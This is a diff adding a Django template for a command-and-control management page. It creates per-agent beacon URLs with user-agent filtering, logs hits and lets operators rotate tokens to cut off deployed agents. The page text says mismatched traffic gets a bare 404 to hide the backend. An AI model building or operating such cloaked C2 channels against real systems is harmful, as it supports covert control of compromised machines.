@@ -1,0 +1,31 @@
+{% extends "base.html" %}
+{% block content %}
+<section class="panel page-panel">
+  <div class="panel-heading"><div><span class="section-label">C2 EDGE</span><h2>Agent channels</h2><p>Per-agent beacon URLs under <code>{{ base_path }}</code>. nginx proxies matching traffic to the C2 backend; mismatched UAs get a bare 404. Rotate a token to burn a deployed agent.</p></div></div>
+  <form class="filter-bar" method="post" action="{% url 'gate-agents' %}">
+    {% csrf_token %}
+    <label><span>LABEL</span><input class="field-input" name="label" required maxlength="120" placeholder="agent-07"></label>
+    <label><span>UA REGEX (empty = allow all)</span><input class="field-input mono" name="ua_pattern" maxlength="240" placeholder="Mozilla/5\.0.*Windows NT"></label>
+    <label><span>NOTE</span><input class="field-input" name="note" maxlength="240"></label>
+    <button class="button" type="submit">Create channel</button>
+  </form>
+  {% if agents %}
+  <div class="table-wrap"><table><thead><tr><th>URL</th><th>LABEL</th><th>UA PATTERN</th><th>HITS</th><th>LAST SEEN / UTC</th><th>STATUS</th><th></th></tr></thead><tbody>
+    {% for agent in agents %}
+    <tr>
+      <td class="mono path-cell" data-copy="#agent-url-{{ agent.pk }}"><input id="agent-url-{{ agent.pk }}" readonly value="{{ agent.path }}" style="position:absolute;left:-9999px">{{ agent.path }} <button class="text-button" type="button">COPY</button></td>
+      <td>{{ agent.label }}{% if agent.note %}<br><span class="muted">{{ agent.note }}</span>{% endif %}</td>
+      <td class="mono muted">{{ agent.ua_pattern|default:"(any)"|truncatechars:40 }}</td>
+      <td class="mono">{{ agent.hits }}</td>
+      <td class="mono muted nowrap">{{ agent.last_seen_at|date:"Y-m-d H:i:s"|default:"-" }}</td>
+      <td>{% if agent.active %}<span class="status-badge good">ACTIVE</span>{% else %}<span class="status-badge">DISABLED</span>{% endif %}</td>
+      <td>
+        <form method="post" action="{% url 'gate-agent-toggle' agent.pk %}" style="display:inline">{% csrf_token %}<button class="text-button" type="submit">{{ agent.active|yesno:"Disable,Enable" }}</button></form>
+        <form method="post" action="{% url 'gate-agent-rotate' agent.pk %}" style="display:inline" data-confirm="Rotate token? The deployed agent will stop beaconing.">{% csrf_token %}<button class="text-button" type="submit">ROTATE</button></form>
+      </td>
+    </tr>
+    {% endfor %}
+  </tbody></table></div>
+  {% else %}<div class="empty-state"><strong>No agent channels</strong><p>Create per-agent beacon URLs to track and revoke individual agents.</p></div>{% endif %}
+</section>
+{% endblock %}
